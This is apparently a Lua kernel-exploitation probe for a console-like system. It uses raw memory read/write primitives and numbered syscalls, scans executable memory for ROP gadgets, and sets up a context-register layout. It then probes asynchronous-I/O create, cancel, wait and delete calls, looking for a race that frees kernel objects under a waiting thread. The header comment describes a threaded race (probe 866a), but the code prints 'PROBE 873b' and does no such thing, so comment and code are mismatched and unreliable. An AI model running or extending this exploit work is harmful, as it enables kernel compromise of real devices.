-- CRASH_CLASS: HIGH
-- PROBE 866a: delete an aio id while a thread is blocked inside 663 (aio_multi_wait)
--
-- Every earlier race released deleters into the table lock from userland, and the
-- winner always finished before a second caller reached the lookup.  This probe
-- puts the second caller *inside the kernel first*: a child parks in read(2),
-- is released, issues 663(ids,1,out,0) (NULL timeout = unbounded) on a pending
-- object, and only then does the Lua thread issue 662 on the same id.  If the
-- wait holds the table lock the delete serialises behind it; if it does not, the
-- delete frees C/S/D/P/T under a parked waiter - the overlap nobody measured.
print("=== PROBE 873b: do cancel/wait/submit flip a pending object to state 3? ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
local info = memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off=0
    while off < limit do
        local want = limit-off; if want > 0x1000 then want = 0x1000 end
        local ok,s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s)~="string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base+off+i-1 end
        off = off + want
    end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[0] gadgets missing") return end
local sc_mmap=mk(477)
local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return sc_mmap(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local D=mmap(page); local ids=mmap(page); local st=mmap(page); local out=mmap(page); local bufp=mmap(page); local outp=mmap(page)
local fds=memory.alloc(8)
wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
local ok,rp=pcall(function() return mk(SOCKETPAIR)(uint64(1),uint64(1),uint64(0),uint64(fds)) end)
print(string.format("[A] socketpair ok=%s rv=%s fds=%s/%s", tostring(ok), tostring(rp), tostring(rd(fds)), tostring(rd(fds+4))))
local a, b = rd(fds) or -1, rd(fds+4) or -1
if a < 0 then print("[A] no fd") return end
-- descriptor: +0 len, +0x10 buf, +0x18 res, +0x20 fd  (never written -> create stays pending)
wq(D+0x00,uint64(0)); wq(D+0x08,uint64(0x1000)); wq(D+0x10,uint64(bufp)); wq(D+0x18,uint64(outp)); wd(D+0x20, a); wd(D+0x24,0)
local sc669,sc662,sc664=mk(669),mk(662),mk(664),nil
local okc, rvc = pcall(function() return sc669(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out)) end)
local id = rd(out) or 0
print(string.format("[B] create ok=%s rv=%s id=%08X", tostring(okc), tostring(rvc), id))
wd(ids, id)
pcall(function() sc664(uint64(ids),uint64(1),uint64(st)) end)
print(string.format("[C] poll status=%08X (1 = pending)", rd(st) or 0))
local pst = rd(st) or 0

local function pollst()
    wd(ids,id)
    pcall(function() mk(664)(uint64(ids),uint64(1),uint64(st)) end)
    return rd(st) or 0
end
local function clear(idv)
    wd(ids,idv)
    pcall(function() mk(662)(uint64(ids),uint64(1),uint64(st)) end)
    return rd(st) or 0
end
local tmo = memory.alloc(8)
print(string.format("[C] id=%08X pending state=%08X", id, pst))
-- 666 cancel
wd(ids,id); pcall(function() mk(666)(uint64(ids),uint64(1),uint64(st)) end)
print(string.format("[D] 666 cancel rv-status=%08X after-poll=%08X", rd(st) or 0, pollst()))
-- 663 wait with 2 ms timeout
wd(tmo,2000)
wd(ids,id); pcall(function() mk(663)(uint64(ids),uint64(1),uint64(st),uint64(tmo)) end)
print(string.format("[E] 663 wait(2ms) rv-status=%08X after-poll=%08X", rd(st) or 0, pollst()))
-- 670 with cmd 0 and 1
for c=0,1 do
    wd(ids,id); pcall(function() mk(670)(uint64(c),uint64(ids),uint64(1),uint64(st)) end)
    print(string.format("[F%d] 670 cmd=%d rv-status=%08X after-poll=%08X", c, c, rd(st) or 0, pollst()))
end
-- delete and report the gate
print(string.format("[G] delete status=%08X", clear(id)))
print(string.format("[H] health: create->poll->delete"))
local out2 = mmap(page)
local okh,rvh = pcall(function() return mk(669)(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out2)) end)
local id2 = rd(out2) or 0
wd(ids,id2); pcall(function() mk(664)(uint64(ids),uint64(1),uint64(st)) end)
local s2 = rd(st) or 0
wd(ids,id2); pcall(function() mk(662)(uint64(ids),uint64(1),uint64(st)) end)
print(string.format("[H] create=%s id=%08X poll=%08X delete=%08X", tostring(okh), id2, s2, rd(st) or 0))
print("[Z] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
